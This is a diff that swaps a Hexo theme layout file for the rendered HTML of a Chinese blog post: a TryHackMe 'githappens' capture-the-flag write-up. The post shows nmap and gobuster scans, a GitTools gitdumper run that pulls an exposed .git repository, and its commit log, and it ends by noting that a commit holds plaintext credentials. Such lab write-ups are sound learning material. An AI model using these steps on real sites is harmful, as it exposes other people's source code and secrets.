@@ -1,161 +1,522 @@
-const { Component } = require('inferno');
-const classname = require('hexo-component-inferno/lib/util/classname');
-const Head = require('./common/head');
-const Navbar = require('./common/navbar');
-const Widgets = require('./common/widgets');
-const Footer = require('./common/footer');
-const Scripts = require('./common/scripts');
-const Search = require('./common/search');
 
-module.exports = class extends Component {
-    render() {
-        const { site, config, page, helper, body } = this.props;
-        const { comment, use_pjax, has_banner } = config;
-        const { __, my_cdn, url_for } = helper;
+    <!DOCTYPE html>
+    <html lang="en"
+            
+          
+    >
+    <head>
+    <meta charset="utf-8">
+    
 
-        // 默认不加载公式，文中头部开启mathJax:true才加载
-        var isMath = page.mathJax != undefined && page.mathJax;
-        const language = page.lang || page.language || config.language;
-        const columnCount = Widgets.getColumnCount(config.widgets);
-        const hasComment = comment != undefined && comment.type != undefined && (comment.type == 'gitalk' || comment.type == 'valine')
-            && (comment.has_hot_recommend || comment.has_latest_comment);
-        var appKey;
-        var appId;
-        var userName;
-        var userRepo;
-        var isValine;
+    
 
-        if (comment != undefined && comment.type != undefined && comment.type == 'gitalk') {
-            appId = comment.client_id;
-            appKey = comment.client_secret;
-            userName = comment.owner;;
-            userRepo = comment.repo;
-            isValine = false;
-        } else if (comment != undefined && comment.type != undefined && comment.type == 'valine') {
-            appId = comment.app_id;
-            appKey = comment.app_key;
-            userName = comment.owner;
-            isValine = true;
-        }
-        var hotTitle = __('widget.hot_recommend');
-        var hotTip = __('widget.hot_recommend_tip');
-
-        // =====index hot_recommend
-        var hotRecommendStr =
-            `<div class="card widget">
-            <div class="card-content">
-                <h3 class="menu-label">${hotTitle}</h3><span id="index_hot_div">${hotTip}</span>
-            </div>
-        </div>`;
-
-        // =====index banner
-        var bannerStr =
-            `<div class="card widget">
-            <div class="card-content1 card-image">
-                <span id="banner"><div class="card-content ">Banner ${hotTip}</div></span>
-            </div>
-        </div>`;
+    
+    <title>
+        githappens |
         
-        // mathjax support 使用方法 md文章头部开启mathJax: true，md文章中公式格式：$$f(x) = a_1x^n + a_2x^{n-1} + a_3x^{n-2}$$
-        var mathJaxJs = `function loadMathJax() { //加载mathjax
-            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
-                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
-                var math = document.getElementsByClassName("entry-content")[0];
-                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
-            });
-        };loadMathJax();`;
+        hackboy</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+    
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">
 
-        var pjaxJs = `var pjax = new Pjax({
-            elements: "a",//代表点击链接就更新
-            selectors: [  //代表要更新的节点
-                ".section",
-                "title"
-            ],
-            cache: true,
-            cacheBust:false
-        })
+    
+<link rel="stylesheet" href="/css/loader.css">
 
-        function loadBusuanzi(){
-        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
-        }
-
-        function loadMathJax() { //加载mathjax
-            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
-                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
-                var math = document.getElementsByClassName("entry-content")[0];
-                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
-            });
-        };
-
-        // 开始 PJAX 执行的函数
-        document.addEventListener('pjax:send', function () {
-        });
+    <meta name="description" content="1.扫描网段123456789101112131415161718┌──(root㉿kali)-[&#x2F;home&#x2F;ace&#x2F;桌面&#x2F;GitTools]└─# nmap -T4 -sC -sV  10.10.78.105 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-08 15:38 CSTNmap scan report for 10.10.78.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="githappens">
+<meta property="og:url" content="http://example.com/2023/08/08/githappens/index.html">
+<meta property="og:site_name" content="hackboy">
+<meta property="og:description" content="1.扫描网段123456789101112131415161718┌──(root㉿kali)-[&#x2F;home&#x2F;ace&#x2F;桌面&#x2F;GitTools]└─# nmap -T4 -sC -sV  10.10.78.105 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-08 15:38 CSTNmap scan report for 10.10.78.1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pic/image-20230808154326063.png">
+<meta property="og:image" content="http://example.com/pic/image-20230808161324044.png">
+<meta property="article:published_time" content="2023-08-08T07:39:03.000Z">
+<meta property="article:modified_time" content="2023-08-08T08:23:25.697Z">
+<meta property="article:author" content="honkerZ">
+<meta property="article:tag" content="tryhackme">
+<meta property="article:tag" content="gittools">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pic/image-20230808154326063.png">
+    
+        <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
         
-        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
-        document.addEventListener('pjax:complete', function () {
-            $(".section").css({opacity:1});
-            if(${hasComment}){
-                $.getScript('${my_cdn(url_for('/js/comment-issue-data.js'))}',function(){loadIssueData('${appId}','${appKey}','${userName}','${userRepo}',${isValine});});
-            }
-            if(${isMath}){
-                loadMathJax();
-            }
-            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
-            loadBackTop();
-            loadBusuanzi();
-            if(typeof loadBanner == 'function'){
-                loadBanner();
-            }
-        });`;
+<link rel="stylesheet" href="https://unpkg.com/typeface-source-code-pro@1.1.13/index.css">
 
-        if (comment == undefined || comment.type == undefined
-            || comment.type != 'gitalk'
-            || comment.has_hot_recommend == undefined
-            || !comment.has_hot_recommend) {
-            hotRecommendStr = '';
-        }
+    
+    
+<link rel="stylesheet" href="/css/style.css">
 
-        var indexTopData = hotRecommendStr;
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
 
-        const hasBanner = has_banner != undefined && has_banner;
+    
+    
+    
+    
+    
+<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>
 
-        if (indexTopData == '' && hasBanner) {
-            indexTopData = bannerStr;
-        }
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">
 
-        if (page.path != 'index.html') {
-            indexTopData = '';
-        }
+        
+<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>
 
-        let isPageOrPost = page.layout == 'page' || page.layout == 'post';
-        return <html lang={language ? language.substr(0, 2) : ''}>
-            <Head site={site} config={config} helper={helper} page={page} />
-            <body className={`is-${columnCount}-column has-navbar-fixed-top`}>
-                <Navbar config={config} helper={helper} page={page} />
-                <script type="text/javascript" src={my_cdn(url_for('/js/theme-setting.js'))}></script>
-                <section class="section">
-                    <div class="container">
-                        <div class="columns">
-                            <div class={classname({
-                                column: true,
-                                'order-2': true,
-                                'column-main': true,
-                                'is-12': columnCount === 1,
-                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
-                                'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2 || page.layout === 'post'
-                            })} dangerouslySetInnerHTML={{__html: indexTopData + body}}></div>
-                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'}/>
-                            {isPageOrPost ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'}/>}
-                        </div>
-                    </div>
-                </section>
-                <Footer config={config} helper={helper} />
-                <Scripts site={site} config={config} helper={helper} page={page} />
-                <Search config={config} helper={helper} />
-                {use_pjax ? <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> : null}
-                {use_pjax ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: pjaxJs }}></script> : null}
-                {isMath ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: mathJaxJs }}></script> : null}
-            </body>
-        </html>;
-    }
-};
+        <script>
+          new WOW({
+            offset: 0,
+            mobile: true,
+            live: false
+          }).init();
+        </script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+    
+<div id='loader'>
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="loading-taichi">
+      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+    </svg>
+    </div>
+    <div class="loading-word">黑客学习...</div>
+  </div>
+</div>
+</div>
+
+<script>
+  const endLoading = function() {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('load', endLoading);
+  document.getElementById('loader').addEventListener('click', endLoading);
+</script>
+
+
+    <div id="container">
+        <div id="wrap">
+            <header id="header">
+    
+        <img data-src="http://lc-PwMydsXe.cn-n1.lcfile.com/VRTQhfANGQcL6GehDTgE7rK59CG5rwrD/1%20%286%29.jpg" data-sizes="auto" alt="githappens" class="lazyload">
+    
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <div id="logo-wrap">
+                
+                    
+                    
+                        <a href="/" id="logo"><h1>githappens</h1></a>
+                    
+                
+            </div>
+            
+                
+                
+            
+        </div>
+        <div id="header-inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/">Home</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/archives">Archives</a>
+                    </span>
+                
+            </nav>
+            <nav id="sub-nav">
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
+                       title="RSS Feed"></a>
+                
+                
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+            </div>
+        </div>
+    </div>
+</header>
+
+            <div id="content" class="outer">
+                <section id="main"><article id="post-githappens" class="h-entry article article-type-post"
+         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <div class="article-inner">
+        <div class="article-meta">
+            <div class="article-date wow slideInLeft">
+    <a href="/2023/08/08/githappens/" class="article-date-link">
+        <time datetime="2023-08-08T07:39:03.000Z"
+              itemprop="datePublished">2023-08-08</time>
+    </a>
+</div>
+
+            
+    <div class="article-category wow slideInLeft">
+        <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
+    </div>
+
+
+        </div>
+        <div class="hr-line"></div>
+        
+
+        <div class="e-content article-entry" itemprop="articleBody">
+            
+                <h2 id="1-扫描网段"><a href="#1-扫描网段" class="headerlink" title="1.扫描网段"></a>1.扫描网段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面/<span class="type">GitTools</span>]</span><br><span class="line">└─<span class="comment"># nmap -T4 -sC -sV  10.10.78.105 </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-08-08</span> <span class="number">15</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">78.105</span></span><br><span class="line">Host is up (<span class="number">0.28</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.14</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">| http<span class="literal">-git</span>: </span><br><span class="line">|   <span class="number">10.10</span>.<span class="number">78.105</span>:<span class="number">80</span>/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|_    Repository description: Unnamed repository; edit this file <span class="string">&#x27;description&#x27;</span> to name the...</span><br><span class="line">|_http<span class="literal">-title</span>: Super Awesome Site!</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.14</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15.71</span> seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-查看网页"><a href="#2-查看网页" class="headerlink" title="2.查看网页"></a>2.查看网页</h2><p><img src="/../pic/image-20230808154326063.png" alt="image-20230808154326063"></p>
+<p>扫一下目录</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面/<span class="type">GitTools</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.78.105/</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">10.10</span>.<span class="number">78.105</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">08</span> <span class="number">15</span>:<span class="number">44</span>:<span class="number">46</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.git/HEAD            (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">23</span>]</span><br><span class="line">/css                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">194</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.78.105</span>/<span class="type">css</span>/]</span><br><span class="line">/index.html           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">6890</span>]</span><br><span class="line">Progress: <span class="number">4614</span> / <span class="number">4615</span> (<span class="number">99.98</span>%)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">08</span> <span class="number">15</span>:<span class="number">46</span>:<span class="number">55</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>通过nmap扫描和gobuster，确认存在.git</p>
+<h2 id="3-用gittools获得存储库"><a href="#3-用gittools获得存储库" class="headerlink" title="3.用gittools获得存储库"></a>3.用gittools获得存储库</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面/<span class="type">GitTools</span>/<span class="type">Dumper</span>]</span><br><span class="line">└─<span class="comment"># ./gitdumper.sh http://10.10.78.105/.git/ /data/githappens</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[-] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[+] Downloaded: packed<span class="literal">-refs</span></span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[-] Downloaded: /refs/wip/index/refs/heads/master</span><br><span class="line">[-] Downloaded: /refs/wip/wtree/refs/heads/master</span><br><span class="line">[+] Downloaded: objects/d0/b3578a628889f38c0affb1b75457146a4678e5</span><br><span class="line">[-] Downloaded: objects/<span class="number">00</span>/<span class="number">00000000000000000000000000000000000000</span></span><br><span class="line">[+] Downloaded: objects/b8/<span class="number">6</span>ab47bacf3550a5450b0eb324e36ce46ba73f1</span><br><span class="line">[+] Downloaded: objects/<span class="number">77</span>/aab78e2624ec9400f9ed3f43a6f0c942eeb82d</span><br><span class="line">[+] Downloaded: objects/f1/<span class="number">4</span>bcee8053e39eeb414053db4ec7b985f65edc8</span><br><span class="line">[+] Downloaded: objects/<span class="number">9</span>d/<span class="number">74</span>a92581071ae7c4a470ff035e0de4598877e5</span><br><span class="line">[+] Downloaded: objects/<span class="number">20</span>/<span class="number">9515</span>b2f7cbdfb731d275c4b089e41ba35c3bc8</span><br><span class="line">[+] Downloaded: objects/<span class="number">5</span>a/<span class="number">35</span>c9b7c787c22f689d0364cf57b013a11561a2</span><br><span class="line">[+] Downloaded: objects/<span class="number">08</span>/<span class="number">906612</span>dfe6821cebc21794eb85601fc4f54de9</span><br><span class="line">[+] Downloaded: objects/<span class="number">4</span>a/<span class="number">2</span>aab268541cbcc434e0565b4f4f2deca29ee5f</span><br><span class="line">[+] Downloaded: objects/<span class="number">7</span>c/<span class="number">578</span>d86a8713b67af2cb1b1d7c524c23cefe7aa</span><br><span class="line">[+] Downloaded: objects/<span class="number">4</span>e/<span class="number">7178</span>fa5b68fec15e54f2b79ace6f9ce0169e01</span><br><span class="line">[+] Downloaded: objects/<span class="number">2</span>e/b93ac3534155069a8ef59cb25b9c1971d5d199</span><br><span class="line">[+] Downloaded: objects/<span class="number">4</span>c/f757268c6824041664d132a29908aa9c362a26</span><br><span class="line">[+] Downloaded: objects/<span class="number">3</span>a/<span class="number">39</span>b02d3b9d12222bac4737ee67e31403d62f13</span><br><span class="line">[+] Downloaded: objects/ae/f68b1e25df81a8c96ee4d57b20cc9f7a1ebee5</span><br><span class="line">[+] Downloaded: objects/d6/df4000639981d032f628af2b4d03b8eff31213</span><br><span class="line">[+] Downloaded: objects/<span class="number">56</span>/<span class="number">820</span>adbbd5ac0f66f61916122c94ea52937e9b2</span><br><span class="line">[+] Downloaded: objects/d9/<span class="number">54</span>a99b96ff11c37a558a5d93ce52d0f3702a7d</span><br><span class="line">[+] Downloaded: objects/<span class="number">06</span>/<span class="number">012255</span>f074d7bc4acc6fadbcff004380b5f83b</span><br><span class="line">[+] Downloaded: objects/bc/<span class="number">8054</span>d9d95854d278359a432b6d97c27e24061d</span><br><span class="line">[+] Downloaded: objects/dd/<span class="number">13038</span>df878d41b774ce4fd4552091d46873c25</span><br><span class="line">[+] Downloaded: objects/<span class="number">8</span>c/<span class="number">94</span>b154aef92380e29a3f16f1a889b56127cf13</span><br><span class="line">[+] Downloaded: objects/e5/<span class="number">6</span>eaa8e29b589976f33d76bc58a0c4dfb9315b1</span><br><span class="line">[+] Downloaded: objects/<span class="number">48</span>/<span class="number">926</span>fdeb371c8ba174b1669d102e8c873afabf1</span><br><span class="line">[+] Downloaded: objects/ce/b8d530ebcf79806dffc981905ec8c2e0d7a65b</span><br><span class="line">[+] Downloaded: objects/<span class="number">87</span>/bcbcb476578c6cc90ed39f9404292539fe1c9c</span><br><span class="line">[+] Downloaded: objects/<span class="number">39</span>/<span class="number">5</span>e087334d613d5e423cdf8f7be27196a360459</span><br><span class="line">[-] Downloaded: objects/<span class="number">40</span>/<span class="number">04</span>c23a71fd6ba9b03ec9cb7eed08471197d843</span><br><span class="line">[-] Downloaded: objects/<span class="number">19</span>/a865c5442a9d6a7c7cbea070f3cb6aa5106ef8</span><br><span class="line">[-] Downloaded: objects/<span class="number">0</span>f/<span class="number">679</span>a88dbbaf89ff64cb351a151a5f29819a3c0</span><br><span class="line">[+] Downloaded: objects/<span class="number">0</span>e/abcfcd62467d64fb30b889e8de5886e028c3ed</span><br><span class="line">[+] Downloaded: objects/ba/<span class="number">5</span>e4a76e3f7b6c49850c41716f8f1091fbdc84e</span><br><span class="line">[+] Downloaded: objects/<span class="number">2</span>f/<span class="number">423697</span>bf81fe5956684f66fb6fc6596a1903cc</span><br><span class="line">[+] Downloaded: objects/e3/<span class="number">8</span>d9df9b13e6499b749e36e064ec30f2fa45657</span><br><span class="line">[+] Downloaded: objects/<span class="number">0</span>e/<span class="number">0</span>de07611ada4690fc0ea5b5c04721ba6f3fd0d</span><br><span class="line">[+] Downloaded: objects/<span class="number">66</span>/<span class="number">64</span>f4e548df7591da3728d7662b6376debfce8d</span><br></pre></td></tr></table></figure>
+
+<p>查看结果</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">data</span>/<span class="type">githappens</span>]</span><br><span class="line">└─<span class="comment"># git log                                                                     </span></span><br><span class="line">commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -&gt; master, tag: v1.<span class="number">0</span>)</span><br><span class="line">Author: Adam Bertrand &lt;hydragyrum@gmail.com&gt;</span><br><span class="line">Date:   Thu Jul <span class="number">23</span> <span class="number">22</span>:<span class="number">22</span>:<span class="number">16</span> <span class="number">2020</span> +<span class="number">0000</span></span><br><span class="line"></span><br><span class="line">    Update .gitlab<span class="literal">-ci</span>.yml</span><br><span class="line"></span><br><span class="line">commit <span class="number">77</span>aab78e2624ec9400f9ed3f43a6f0c942eeb82d</span><br><span class="line">Author: Hydragyrum &lt;hydragyrum@gmail.com&gt;</span><br><span class="line">Date:   Fri Jul <span class="number">24</span> <span class="number">00</span>:<span class="number">21</span>:<span class="number">25</span> <span class="number">2020</span> +<span class="number">0200</span></span><br><span class="line"></span><br><span class="line">    add gitlab<span class="literal">-ci</span> config to build docker file.</span><br><span class="line"></span><br><span class="line">commit <span class="number">2</span>eb93ac3534155069a8ef59cb25b9c1971d5d199</span><br><span class="line">Author: Hydragyrum &lt;hydragyrum@gmail.com&gt;</span><br><span class="line">Date:   Fri Jul <span class="number">24</span> <span class="number">00</span>:<span class="number">08</span>:<span class="number">38</span> <span class="number">2020</span> +<span class="number">0200</span></span><br><span class="line"></span><br><span class="line">    setup dockerfile and setup defaults.</span><br><span class="line"></span><br><span class="line">commit d6df4000639981d032f628af2b4d03b8eff31213</span><br><span class="line">Author: Hydragyrum &lt;hydragyrum@gmail.com&gt;</span><br><span class="line">Date:   Thu Jul <span class="number">23</span> <span class="number">23</span>:<span class="number">42</span>:<span class="number">30</span> <span class="number">2020</span> +<span class="number">0200</span></span><br><span class="line"></span><br><span class="line">    Make sure the css is standard<span class="literal">-ish</span>!</span><br><span class="line"></span><br><span class="line">commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d</span><br><span class="line">Author: Hydragyrum &lt;hydragyrum@gmail.com&gt;</span><br><span class="line">Date:   Thu Jul <span class="number">23</span> <span class="number">23</span>:<span class="number">41</span>:<span class="number">12</span> <span class="number">2020</span> +<span class="number">0200</span></span><br><span class="line"></span><br><span class="line">    re<span class="literal">-obfuscating</span> the code to be really secure!</span><br><span class="line"></span><br><span class="line">commit bc8054d9d95854d278359a432b6d97c27e24061d</span><br><span class="line">Author: Hydragyrum &lt;hydragyrum@gmail.com&gt;</span><br><span class="line">Date:   Thu Jul <span class="number">23</span> <span class="number">23</span>:<span class="number">37</span>:<span class="number">32</span> <span class="number">2020</span> +<span class="number">0200</span></span><br><span class="line"></span><br><span class="line">    Security says obfuscation isn<span class="string">&#x27;t enough.</span></span><br><span class="line"><span class="string">:</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p>这些提交，我们可以用来 <code>git show</code> 突出显示提交中的文件修改（我们将从提交的相反顺序开始）。对于带有 ID 的初始提交，没有什么有趣的，但是带有 ID <code>2f423697bf81fe5956684f66fb6fc6596a1903cc</code> <code>395e087334d613d5e423cdf8f7be27196a360459</code> 的第二次提交揭示了页面的源代码，其中凭据以明文显示：</p>
